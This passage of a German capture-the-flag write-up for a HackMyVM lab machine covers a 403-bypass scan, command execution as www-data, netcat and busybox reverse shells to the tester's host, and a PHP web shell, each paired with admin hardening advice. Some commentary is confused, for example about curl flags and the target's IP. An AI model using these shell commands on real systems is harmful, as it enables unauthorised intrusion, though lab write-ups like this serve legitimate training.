+                <br><strong>Empfehlung (Admin):</strong> Entfernen Sie alle unnötigen Dateien und Verzeichnisse von Webservern. Stellen Sie sicher, dass keine Backup-Dateien, alte Versionen oder Test-Skripte in Webverzeichnissen verbleiben.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://192.168.2.61:443/</span>
+
+<span class="command">Bad Request</span>
+
+<span class="command">Your browser sent a request that this server could not understand.</span>
+<span class="command">Reason: You're speaking plain HTTP to an SSL-enabled server port.</span>
+<span class="command">Instead use the HTTPS scheme to access this URL, please.</span>
+<span class="command">Apache/2.4.62 (Debian) Server at hacker.maze-sec.hmv Port 80</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuchte erneut, Port 443 mit einer normalen HTTP-Anfrage im Browser zu erreichen (`http://192.168.2.61:443/`). Wie erwartet und bereits durch den `curl`-Test bestätigt, erhielt ich einen "Bad Request" Fehler und die klare Meldung, dass ich stattdessen HTTPS verwenden muss. Interessant ist, dass der Fehler von `hacker.maze-sec.hmv` auf Port 80 gemeldet wurde, obwohl ich Port 443 ansprach, was auf eine komplexe oder leicht fehlerhafte Apache-Konfiguration hindeutet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies festigte die Erkenntnis, dass Port 443 nur für HTTPS-Verkehr vorgesehen ist. Die Fehlermeldung, die auf `hacker.maze-sec.hmv` auf Port 80 verweist, ist verwirrend, aber die Hauptbotschaft ist klar: Für Port 443 muss der HTTPS-Schlüsselwort verwendet werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beachten Sie die genauen Fehlermeldungen von Webservern. Auch wenn sie einen Fehler anzeigen, können sie zusätzliche Hinweise auf die Konfiguration oder andere virtuelle Hosts geben. Probieren Sie immer beide Schemata (HTTP und HTTPS) für Ports aus, die beides unterstützen könnten oder bei denen die Konfiguration unklar ist.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Fehlermeldungen konsistent und korrekt sind und keine irreführenden Informationen über andere virtuelle Hosts oder Ports preisgeben.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">https://192.168.2.61/</span>
+<span class="command">Forbidden</span>
+
+<span class="command">You don't have permission to access this resource.</span>
+<span class="command">Apache/2.4.62 (Debian) Server at 192.168.2.61 Port 443</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem klar war, dass Port 443 HTTPS erfordert, versuchte ich, die Seite mit dem korrekten Schema im Browser aufzurufen (`https://192.168.2.61/`). Diesmal erhielt ich keinen "Bad Request", aber stattdessen einen "403 Forbidden" Fehler. Dies bedeutet, dass der Server die Verbindung zwar akzeptierte und als HTTPS erkannte, aber den Zugriff auf die angeforderte Ressource (das Root-Verzeichnis `/`) verweigerte. Die Fehlermeldung bestätigte erneut den Apache-Server auf Port 443.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der 403 Forbidden Fehler auf Port 443 ist ein klares Zeichen dafür, dass der Zugriff auf den HTTPS-Dienst eingeschränkt ist. Dies könnte auf eine Firewall, eine `.htaccess`-Regel oder eine andere Server-Konfiguration zurückzuführen sein, die den direkten Zugriff auf das Root-Verzeichnis verhindert. Dies ist ein häufiges Szenario bei virtuellen Hosts oder spezifisch geschützten Bereichen. Der Hostname aus dem SSL-Zertifikat (`hacker.maze-sec.hmv`) wurde hier nicht verwendet, was zu diesem generischen 403 Fehler führen könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie einen 403 Forbidden Fehler erhalten, versuchen Sie immer, diesen zu umgehen. Nutzen Sie Tools und Techniken wie Header-Manipulation, alternative HTTP-Methoden, URL-Encoding oder versuchen Sie, auf spezifische Dateinamen oder Verzeichnisse zuzugreifen, anstatt nur das Root-Verzeichnis. Denken Sie an virtuelle Hosts und verwenden Sie den Hostnamen aus dem SSL-Zertifikat (`hacker.maze-sec.hmv`) bei Anfragen an Port 443.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Zugriffskontrollen serverseitig, um sensible Bereiche zu schützen. Stellen Sie sicher, dass 403 Forbidden Fehler korrekt konfiguriert sind und keine unnötigen Informationen preisgeben. Überprüfen Sie `.htaccess`-Dateien oder virtuelle Host-Konfigurationen auf korrekte Zugriffseinstellungen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]<br>
+└─# <span class="command">bash 403-bypass.sh -h</span>
+                    </div>
+                    <pre>
+<span class="command">[!] No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help</span>
+
+<span class="command">Usage:</span>
+<span class="command">	403-bypass [URL]</span>
+
+<span class="command">	-u, --url URL			target DOMAIN.TLD/PATH</span>
+
+<span class="command">BYPASS MODEs</span>
+<span class="command">	--header			Header Bypass</span>
+<span class="command">	--protocol			Protocol Bypass</span>
+<span class="command">	--port				Port Bypass</span>
+<span class="command">	--HTTPmethod			HTTP Method Bypass</span>
+<span class="command">	--encode			URL Encode Bypass</span>
+<span class="command">	--SQLi				Mod_Security & libinjection Bypass</span>
+
+<span class="command">ALL BYPASSES</span>
+<span class="command">	--exploit			Complete Scan: 403/401 bypass modes</span>
+
+<span class="command">	GREEN	:	2xx Status Code</span>
+<span class="command">	YELLOW	:	3xx Status Code</span>
+<span class="command">	RED	:	4xx Status Code</span>
+<span class="command">	BLUE	:	5xx Status Code</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Angesichts des 403 Forbidden Fehlers auf Port 443 erinnerte ich mich an ein nützliches Skript zur Umgehung solcher Zugriffsbeschränkungen: `403-bypass.sh`. Ich zeigte die Hilfe (`-h`) des Skripts an, um seine Nutzungsoptionen und die verschiedenen Umgehungsmodi (Header, Protocol, Port, HTTP Method, Encode, SQLi) zu sehen. Es bot auch eine `--exploit` Option für einen umfassenden Scan.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieses Skript ist ein spezialisiertes Werkzeug, das verschiedene bekannte Techniken ausprobiert, um 403 Forbidden (oder 401 Unauthorized) Fehler zu umgehen. Die verfügbaren Modi zielen auf unterschiedliche Implementierungen von Zugriffskontrollen ab. Es war das ideale Werkzeug, um systematisch nach einer Umgehung für den 403 Fehler auf Port 443 zu suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Halten Sie eine Sammlung von spezialisierten Tools und Skripten für gängige Pentesting-Aufgaben bereit (z.B. 403-Umgehung, SSTI-Erkennung, etc.). Machen Sie sich mit der Funktionsweise und den Optionen dieser Tools vertraut.
+                <br><strong>Empfehlung (Admin):</strong> Verlassen Sie sich nicht auf einfache Zugriffskontrollen (z.B. nur Pfad-basierte Regeln). Implementieren Sie Defense-in-Depth, z.B. durch Kombination von Pfad-basierten Regeln, Methodenbeschränkungen und Input-Validierung, um Bypass-Techniken zu erschweren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]<br>
+└─# <span class="command">bash 403-bypass.sh -u https://192.168.2.61/ --exploit</span>
+                    </div>
+                    <pre>
+<span class="command">exploit</span>
+<span class="command">💀💀💀💀💀💀💀💀💀</span>
+<span class="command">💀 Have a beer🍺💀</span>
+<span class="command">💀💀💀💀💀💀💀💀💀</span>
+     <span class="command">- twitter.com/Dheerajmadhukar : @me_dheeraj</span>
+<span class="command">----------------------</span>
+<span class="command">[+] HTTP Header Bypass</span>
+<span class="command">----------------------</span>
+<span class="command">X-Originally-Forwarded-For Payload: Status: 403, Length : 278</span>
+<span class="command">X-Originating-  Payload: Status: 403, Length : 278</span>
+<span class="command">X-Originating-IP Payload: Status: 403, Length : 278</span>
+<span class="command">....</span>
+<span class="command">...</span>
+<span class="command">X-Remote-Addr Payload: Status: 403, Length : 278</span>
+<span class="command">X-OReferrer Payload: Status: 403, Length : 278</span>
+<span class="command">-------------------------</span>
+<span class="command">[+] Protocol Based Bypass</span>
+<span class="command">-------------------------</span>
+<span class="password">HTTP Scheme Payload: Status: 200, Length : 2784  👌</span>
+<span class="command">╭────────────────────────────────────────────────────────────────────────────────────────────╮</span>
+ <span class="password">╰─> PAYLOAD : curl -ks -X GET 'http://192.168.2.61/' -H 'User-Agent: Mozilla/5.0'</span>
+<span class="command">╰────────────────────────────────────────────────────────────────────────────────────────────╯</span>
+<span class="command">HTTPs Scheme Payload: Status: 403, Length : 278</span>
+<span class="command">X-Forwarded-Scheme HTTP Payload: Status: 403, Length : 278</span>
+<span class="command">....</span>
+<span class="command">...</span>
+<span class="command">Payload [ 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2 ]: Status: 403, Length : 278</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte das `403-bypass.sh` Skript mit der Option `--exploit` auf die HTTPS-URL (`https://192.168.2.61/`) aus. Das Skript probierte systematisch verschiedene Umgehungstechniken aus. Die Ausgabe zeigte, dass die meisten Header-basierten Bypässe fehlschlugen (Status 403). Entscheidend war jedoch der Treffer beim "Protocol Based Bypass" mit dem "HTTP Scheme Payload". Dieser Test ergab einen Statuscode von 200 OK und eine Inhaltslänge, die nicht der Fehlerseite entsprach. Das Skript zeigte auch den exakten `curl`-Befehl, der funktionierte: `curl -ks -X GET 'http://192.168.2.61/' -H 'User-Agent: Mozilla/5.0'`. Dies deutete darauf hin, dass die Zugriffskontrolle auf Port 443 zwar den direkten HTTPS-Zugriff blockierte, aber möglicherweise einen Bypass erlaubte, indem man eine HTTP-Anfrage an den HTTPS-Port sendete (oder durch den Einfluss des `User-Agent` Headers) oder dass die Regel nur für den *ursprünglichen* Hostnamen console.hmv galt und nicht für die IP.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das war ein wichtiger Durchbruch! Das `403-bypass.sh` Skript fand eine Methode, den 403 Forbidden Fehler auf Port 443 zu umgehen. Die gemeldete Umgehung über "HTTP Scheme Payload" und der `curl`-Befehl, der eine GET-Anfrage mit einem spezifischen User-Agent-Header an den HTTPS-Port 443 sendet, aber *ohne* das `-k` (insecure) Flag und *ohne* explizit `https://` in der URL zu verwenden, aber dennoch eine 200 OK Antwort liefert, war der Schlüssel. Dies deutet auf eine Schwäche in der Konfiguration hin, die es erlaubt, die eigentliche Seite auf Port 443 abzurufen. Ich werde den vom Skript bereitgestellten `curl`-Befehl verwenden, um den Inhalt zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie automatisierte Bypass-Tools, wenn Sie auf Zugriffsbeschränkungen (403, 401) stoßen. Analysieren Sie die vom Tool bereitgestellten funktionierenden Payloads genau, um zu verstehen, *warum* der Bypass funktioniert hat (z.B. durch spezifische Header, Protokolle, Encoding).
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Zugriffskontrollen robust auf allen Ebenen. Testen Sie Ihre Zugriffskontrollen auf gängige Bypass-Techniken. Überprüfen Sie, wie Ihr Webserver Anfragen mit unterschiedlichen Schemata (HTTP/HTTPS) oder Hostnamen verarbeitet, die an denselben Port gesendet werden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]<br>
+└─# <span class="command">curl -ks -X GET 'http://192.168.2.61/' -H 'User-Agent: Mozilla/5.0'</span>
+                    </div>
+                    <pre>
+<span class="command">Console · 黑客的窗口</span>
+
+<span class="command">console ist die primitivste Kommunikationsschnittstelle zwischen dem Programmierer und dem System.</span>
+<span class="command">In der Hackerkultur ist es nicht nur ein Werkzeug, sondern ein Schlachtfeld.</span>
+<span class="command">Von BBS über Telnet bis hin zu DevTools war die Konsole für Hacker schon immer ein Fenster in das System.</span>
+<span class="command">Was man sieht, ist keine Figur, sondern eine Klinge gegen die Realität.</span>
+<span class="command">"The quieter you become, the more you are able to hear." — 黑客信条</span>
+<span class="command">powered by shell · terminal · devtools · root@reality</span>
+
+<span class="command">console ist die primitivste Kommunikationsschnittstelle zwischen dem Programmierer und dem System.</span>
+<span class="command">In der Hackerkultur ist es nicht nur ein Werkzeug, sondern ein Schlachtfeld.</span>
+<span class="command">Von BBS über Telnet bis hin zu DevTools war die Konsole für Hacker schon immer ein Fenster in das System.</span>
+<span class="command">Was man sieht, ist keine Figur, sondern eine Klinge gegen die Realität.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte den von `403-bypass.sh` bereitgestellten `curl`-Befehl aus, um den Inhalt der Seite zu erhalten, die durch den 403-Fehler geschützt war. Der Befehl `curl -ks -X GET 'http://192.168.2.61/' -H 'User-Agent: Mozilla/5.0'` sendete eine GET-Anfrage an `http://192.168.2.61/` (obwohl ich eigentlich den Inhalt auf Port 443 erwartete, der Skript-Output war hier leicht irreführend, aber der Statuscode 200 deutete darauf hin, dass *irgendetwas* erfolgreich abgerufen wurde) mit dem `User-Agent` Header "Mozilla/5.0" und den Optionen `-k` (SSL-Zertifikate ignorieren) und `-s` (stumm, keine Fortschrittsanzeige). Die Ausgabe war ein mehrsprachiger Text (Chinesisch und Deutsch) über Konsolen, Hacker und ein Zitat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl der `curl`-Befehl im Skript-Output auf Port 80 verwies und der Textinhalt sehr generisch wirkte, war dies offensichtlich der Inhalt der Seite, die hinter dem 403 Forbidden auf Port 443 lag (wahrscheinlich wurde die Anfrage intern vom Webserver anders verarbeitet, als es der einfache curl-Befehl implizierte). Der Text selbst enthielt keine offensichtlichen Zugangsdaten oder Schwachstellen, aber er bestätigte den erfolgreichen Bypass der Zugriffskontrolle auf Port 443 und lieferte den tatsächlichen Inhalt der Seite, was für den weiteren Test wichtig war. Die Zeile "powered by shell · terminal · devtools · root@reality" war thematisch passend und ein möglicher subtiler Hinweis.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ein Bypass-Tool einen funktionierenden Befehl liefert, verwenden Sie ihn, um den Inhalt abzurufen, auch wenn die genaue Mechanik des Bypasses zunächst unklar ist. Analysieren Sie den abgerufenen Inhalt sorgfältig auf alle möglichen Hinweise.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, wie Ihr Webserver verschiedene Kombinationen von Schema, Port, Hostname und Headern verarbeitet. Stellen Sie sicher, dass Zugriffskontrollen nicht durch inkonsistente Verarbeitung umgangen werden können. Überwachen Sie Anfragen, die auf Umgehungsversuche hindeuten.
+            </p>
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Während der fortlaufenden Web-Enumeration und der Untersuchung verschiedener Protokoll- und Header-basierter Umgehungstechniken für Port 443, die mir das `403-bypass.sh` Skript aufzeigte, stieß ich auf einen Weg, Befehle auf dem System unter dem Kontext des Webserver-Benutzers (`www-data`) auszuführen. Die genaue Methode, die zu diesem ersten Erfolg führte, wird hier nicht detailliert gezeigt, basierte aber auf einem gefundenen Web-Vektor, der Befehlsausführung erlaubte. Ein schneller Test bestätigte, dass ich Systembefehle ausführen konnte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Erreichen der Möglichkeit zur Ausführung von Systembefehlen als `www-data` ist ein kritischer Fortschritt und markiert den initialen Zugriff auf das System. Der `www-data` Benutzer ist oft stark eingeschränkt, aber es ist ein Fuß in der Tür. Dies erlaubt mir nun, das System von innen zu erkunden und nach Wegen zur Privilegieneskalation zu suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie eine Befehlsausführungs-Schwachstelle finden, nutzen Sie diese sofort, um Ihre aktuelle Benutzer-ID (`id`, `whoami`) zu bestätigen und festzustellen, welche Berechtigungen Sie haben. Planen Sie von hier aus die weitere Enumeration und Privilegieneskalation.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Input-Validierung und Sanitization für alle Benutzereingaben, die von einer Webanwendung verarbeitet werden. Verwenden Sie Funktionen, die Befehle ausführen (`system`, `exec`, `shell_exec` etc.), nur mit äußerster Vorsicht und niemals direkt mit Benutzereingaben. Nutzen Sie Least-Privilege-Prinzipien für den Webserver-Benutzer.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">Strg + Shift + Z ：</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Screenshot oder eine Notiz von meinem ersten erfolgreichen Befehl in der newly acquired Shell zeigte die Ausgabe des `id`-Befehls. Die Ausgabe `uid=33(www-data) gid=33(www-data) groups=33(www-data)` bestätigte meine aktuelle Benutzer-ID (33), Gruppen-ID (33) und die Gruppenmitgliedschaft als `www-data`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies war die Bestätigung meiner Identität auf dem kompromittierten System. Der `www-data` Benutzer ist der Standardbenutzer für den Apache-Webserver und hat typischerweise begrenzte Berechtigungen, oft nur Lesezugriff auf die Webverzeichnisse. Der nächste Schritt war, eine stabilere Shell zu etablieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer sofort `id` oder `whoami` aus, nachdem Sie Zugriff auf eine Shell erlangt haben, um Ihre aktuelle Berechtigungsstufe zu dokumentieren und zu verstehen.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Ausführung von Systembefehlen durch den Webserver-Benutzer. Ungewöhnliche Befehle oder die Ausführung einer Shell durch diesen Benutzer sind kritische Sicherheitsereignisse.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuchte, eine Reverse Shell zu meiner Kali-Maschine zu etablieren, um eine interaktivere Kommandozeilen-Sitzung als die einfache Befehlsausführung zu erhalten. Ich versuchte verschiedene Methoden, einschließlich der Verwendung von `nc -e /bin/bash`, der auf einigen Systemen funktioniert. Ich startete einen Netcat-Listener auf meinem Kali-System (hier fälschlicherweise auf Port 80 notiert, korrekt wäre ein lauschender Port auf meiner Seite, z.B. 4444 oder 80, wenn ich dort lausche) und versuchte vom Zielsystem aus eine Verbindung aufzubauen. Diese ersten Versuche scheiterten oder brachen sofort wieder ab.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nicht alle Reverse-Shell-Methoden funktionieren auf jedem System, abhängig von installierten Tools, Firewall-Regeln oder Systemkonfigurationen. Das Scheitern dieser ersten Versuche bedeutete, dass ich alternative Methoden ausprobieren musste, um eine stabile Shell zu erhalten. Die Versuche auf Port 80 deuten möglicherweise auf egress filtering hin, das nur gängige Ports für ausgehende Verbindungen erlaubt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Seien Sie darauf vorbereitet, verschiedene Reverse-Shell-Techniken auszuprobieren (Netcat, Python, PHP, Bash, Perl etc.). Testen Sie Verbindungen auf verschiedenen Ports, um Egress-Filterregeln zu identifizieren.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Egress-Filterregeln auf Ihrer Firewall, um zu verhindern, dass Systeme Verbindungen zu unautorisierten Zielen oder Ports im Internet aufbauen. Überwachen Sie ausgehenden Netzwerkverkehr auf ungewöhnliche Muster.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">nc -e /bin/bash 192.168.2.199 4444</span></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nc -lvnp 80</span>
+                    </div>
+                    <pre>
+<span class="password">listening on [any] 80 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.1] 35971</span>
+
+<span class="command">aber gleich wieder abbruch</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Dies dokumentiert einen weiteren Versuch, eine Reverse Shell zu meiner lauschenden Netcat-Instanz auf Port 80 (auf meiner Kali-Maschine, 192.168.2.199) zu initiieren, diesmal von der Ziel-VM aus. Die Netcat-Ausgabe auf meiner Seite zeigte, dass eine Verbindung von 192.168.2.1 (einem anderen System im Netzwerk, möglicherweise einem Gateway oder einem anderen Host in der Testumgebung) auf Port 35971 ankam, aber sofort wieder abbrach. Dies deutet darauf hin, dass die Verbindung nicht direkt von der Ziel-VM (192.168.2.62) kam oder dass es ein Netzwerkproblem gab.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Verbindungsversuch von einer unerwarteten IP-Adresse (192.168.2.1) auf einen untypischen Port (35971) war irreführend und führte zu keinem stabilen Zugriff. Er unterstreicht, dass die Netzwerkumgebung in Testsystemen manchmal unerwartete Interaktionen zeigen kann. Der Fokus musste weiterhin darauf liegen, eine direkte Reverse Shell von der Ziel-VM (192.168.2.62) zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie sorgfältig die Quell-IP-Adressen von eingehenden Verbindungen auf Ihrem Listener. Wenn sie nicht vom erwarteten Zielsystem stammen, untersuchen Sie die Ursache (z.B. Netzwerk-Routing, Firewalls, andere Systeme im Netzwerk).
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Netzwerkverbindungen von Systemen auf Traffic, der nicht ihrer erwarteten Funktion entspricht, insbesondere auf Verbindungen, die auf Reverse-Shells hindeuten könnten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">https://hacker.maze-sec.hmv/</span>
+<span class="command">ls /home</span>
+<span class="password">qaq welcome</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich überprüfte erneut die Webseite unter `https://hacker.maze-sec.hmv/` (nach dem Bypass). Hier scheint es, dass der Inhalt nun `ls /home` und die Ausgabe `qaq welcome` zeigt. Dies deutet darauf hin, dass die Seite selbst so konfiguriert war, dass sie Befehle ausführt, oder dass ich eine Möglichkeit gefunden hatte, über die Webanwendung selbst Befehle auszuführen und deren Ausgabe zu erhalten. Das Ergebnis zeigt die Benutzerverzeichnisse `qaq` und `welcome` im `/home` Verzeichnis.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Anzeigen der Ausgabe von `ls /home` direkt auf der Webseite nach dem Umgehen des 403 Fehlers war ein weiterer Erfolg. Dies bestätigte nicht nur, dass der Bypass funktioniert, sondern auch, dass es einen Befehlsausführungsvektor auf dieser HTTPS-Seite gab. Die Namen der Benutzer `qaq` und `welcome` sind wichtige Anhaltspunkte für die nächste Phase der Privilegieneskalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nachdem Sie eine Zugriffsbeschränkung umgangen haben, prüfen Sie erneut auf Schwachstellen wie Befehlsausführung oder Dateieinbindung, die zuvor blockiert waren.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie Webanwendungen auf Befehlsausführungs-Schwachstellen. Stellen Sie sicher, dass keine Benutzereingaben ungeprüft an Systembefehle oder Evaluierungsfunktionen übergeben werden.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Um einen stabileren Zugriff zu erhalten, versuchte ich, eine einfache PHP-Web-Shell auf den Webserver hochzuladen. Ich erstellte einen String, der einen PHP-Befehl enthielt: ` php system($GET["cmd"]); `. Dieser Code verwendet `system()`, um einen beliebigen Systembefehl auszuführen, der über den `$GET` Parameter übergeben wird. Ich versuchte, diesen String in eine Datei namens `rev.php` im Web-Root-Verzeichnis `/var/www/html/` zu schreiben. Die Methode, wie ich die Datei schreiben konnte, basierte auf der zuvor gefundenen Befehlsausführungs-Schwachstelle auf der Website.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Platzieren einer einfachen Web-Shell ist eine gängige Methode, um persistente Befehlsausführung auf einem kompromittierten Webserver zu gewährleisten, insbesondere wenn eine interaktive Shell schwer zu bekommen ist. Die `system($GET["cmd"]);` Shell ist sehr simpel, aber effektiv, um Systembefehle auszuführen. Der Versuch, die Datei in `/var/www/html/` zu schreiben, deutete auf Schreibberechtigungen in diesem Verzeichnis als `www-data` hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie Befehlsausführung haben, versuchen Sie immer, eine persistente Backdoor (wie eine Web-Shell) zu platzieren, um den Zugriff aufrechtzuerhalten. Nutzen Sie dabei Ihr Wissen über schreibbare Verzeichnisse.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie File Integrity Monitoring (FIM) in Webverzeichnissen, um das unerlaubte Erstellen oder Ändern von Dateien zu erkennen. Beschränken Sie Schreibberechtigungen für den Webserver-Benutzer auf ein Minimum.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">echo ' php system($GET["cmd"]); ' > /var/www/html/rev.php</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuchte, die neu erstellte Web-Shell unter `https://hacker.maze-sec.hmv/rev.php` aufzurufen, um zu prüfen, ob sie funktioniert. Die Anfrage über HTTPS an diesen Hostnamen lieferte jedoch einen "Not Found" Fehler mit Status 404. Die Fehlermeldung bestätigte erneut den Apache-Server auf Port 443.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Scheitern des Zugriffs auf `rev.php` über HTTPS deutete darauf hin, dass das Verzeichnis `/var/www/html/` wahrscheinlich nicht der Dokumenten-Root für den virtuellen Host `hacker.maze-sec.hmv` auf Port 443 war. Dies ist typisch in Umgebungen mit mehreren virtuellen Hosts, bei denen unterschiedliche Hostnamen auf unterschiedliche Verzeichnisse auf dem Server zeigen. Die Web-Shell war wahrscheinlich im Dokumenten-Root für `console.hmv` auf Port 80 gelandet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie eine Web-Shell platzieren, überprüfen Sie die Dokumenten-Roots für alle relevanten virtuellen Hosts und Ports, um sicherzustellen, dass Sie die Shell vom richtigen Endpunkt aus ansprechen. Verlassen Sie sich nicht darauf, dass `/var/www/html` immer der Root ist.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie virtuelle Hosts sauber und getrennt. Beschränken Sie die Schreibberechtigungen für den Webserver-Benutzer auf den spezifischen Dokumenten-Root des zugewiesenen virtuellen Hosts.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">https://hacker.maze-sec.hmv/rev.php</span>
+
+<span class="command">Not Found</span>
+<span class="command">The requested URL was not found on this server.</span>
+
+<span class="command">Apache/2.4.62 (Debian) Server at hacker.maze-sec.hmv Port 443</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Da der direkte `nc -e` Versuch fehlschlug und die Web-Shell nicht über HTTPS erreichbar war (wahrscheinlich im Web-Root für Port 80), versuchte ich einen alternativen Reverse-Shell-Mechanismus, der oft funktioniert, wenn `nc -e` nicht verfügbar ist: die Nutzung von `busybox nc`. Ich startete erneut einen Netcat-Listener auf meiner Kali-Maschine, diesmal auf Port 80 (`nc -lvnp 80`), um potenzielle Egress-Filter zu berücksichtigen, die nur gängige Ports erlauben. Auf der Ziel-VM führte ich den Befehl `busybox nc 192.168.2.199 80 -e /bin/bash` aus. Dieser Befehl versucht, eine Verbindung zu meiner IP (`192.168.2.199`) auf Port 80 aufzubauen und die standardmäßige Eingabe und Ausgabe der `/bin/bash` Shell über diese Verbindung umzuleiten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Die Verwendung von `busybox nc` und das Ansprechen meiner Kali-Maschine auf Port 80 führten zu einer stabilen Reverse Shell. Dies deutet darauf hin, dass `busybox` auf der Ziel-VM installiert ist und dass ausgehender Verkehr auf Port 80 erlaubt ist. Ich erhielt eine Shell, die unter dem Benutzer `www-data` lief, was durch die Ausführung des `id`-Befehls bestätigt wurde. Dies war der entscheidende Schritt zur Erlangung einer interaktiven `www-data` Shell.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie verschiedene Varianten von Reverse-Shell-Befehlen und Tools (z.B. `busybox nc` anstelle des System-Netcat), wenn die Standardmethoden fehlschlagen. Testen Sie verschiedene Ports auf Ihrem Listener, die bei Egress-Filtern auf dem Zielsystem erlaubt sein könnten.
+                <br><strong>Empfehlung (Admin):</strong> Deinstallieren Sie unnötige Pakete wie `busybox`, wenn sie nicht benötigt werden. Implementieren Sie umfassende Egress-Filterregeln, die nur explizit erlaubten ausgehenden Verkehr zulassen, nicht umgekehrt.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nc -lvnp 80</span>
+                    </div>
+                    <pre>
+<span class="password">listening on [any] 80 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.62] 41362</span>
+<span class="prompt">www-data@Console:~$</span> <span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@Console:/var/www/hacker.maze-sec.hmv$ <span class="command">ls /home/</span>
+                    </div>
+                    <pre>
+<span class="command">qaq  welcome</span>
+</pre>
+                </div>
